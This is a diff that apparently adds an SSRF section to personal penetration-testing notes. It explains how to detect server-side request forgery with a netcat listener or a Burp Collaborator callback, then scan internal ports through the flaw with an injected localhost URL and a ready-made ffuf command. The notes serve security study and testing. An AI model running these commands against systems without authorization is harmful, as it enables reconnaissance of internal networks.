@@ -80,3 +80,37 @@ Detecting Cached Responses
    Fast response → Likely cached
    Slow response → Likely from origin server
 
+____________________________________________________________________________
+SSRF (Server-Side Request Forgery)
+
+1. Any URL parameter that is being called internally in a POST request can be tested for SSRF.
+2. We can test this by providing a Burp Collaborator URL or by creating a listener using netcat:
+   nc -lnvp 8000
+   If we receive a hit or callback from the application, then it is vulnerable to SSRF.
+3. If the response contains the web application's HTML code, the SSRF vulnerability is not blind,
+   i.e., the response is displayed to us.
+4. Enumerating the System:
+   We can use the SSRF vulnerability to conduct a port scan of the internal system
+   to identify running services.
+
+   4.1 Give the URL:
+       http://127.0.0.1:81
+
+   4.2 If we supply a port that is closed (such as 81), we get an error message like:
+       Failed to connect to port number
+
+   4.3 This allows us to conduct an internal port scan of the web server through the SSRF vulnerability.
+       We can automate this using a fuzzer like ffuf.
+       First, create a wordlist of ports you want to scan:
+           seq 1 10000 > ports.txt
+
+   4.4 Use ffuf to fuzz ports and identify open ones:
+       ffuf -w ./ports.txt -u http://URL/index.php -X POST \
+       -H "Content-Type: application/x-www-form-urlencoded" \
+       -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
+       -fr "Failed to connect to"
+
+       OR use a custom POST body based on your parameter:
+       ffuf -w ./ports.txt -u http://URL/index.php -X POST \
+       -H "Content-Type: application/x-www-form-urlencoded" \
+       -d "<Post Body>" -fr "Error message shown when we try to connect"
